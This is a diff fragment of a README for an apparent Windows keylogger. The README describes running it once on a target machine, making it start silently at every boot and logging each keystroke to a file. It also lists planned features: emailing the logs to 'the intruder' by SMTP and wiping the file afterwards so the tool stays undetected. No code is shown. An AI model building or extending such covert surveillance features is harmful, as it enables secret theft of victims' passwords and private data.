@@ -7,7 +7,7 @@ On first start up the program fetches it's  location and on the target pc and th
  So the executable file has to be runned only once on target windows system and then on every windows bootup  it would automatically start in the background and writes all the keystrokes dynamically into the file (after every keystroke ).
  
  ## Way Forward
-Add email feature based on SMTP client so as to mail the stored keystrokes to the intruder .
+ Add email feature based on SMTP client so as to mail the stored keystrokes to the intruder .
 Also after every successful mail eraze all the contents of the file "logs.txt" so as to prevent excess memory usage and remain undetected .
 
 ## Note-
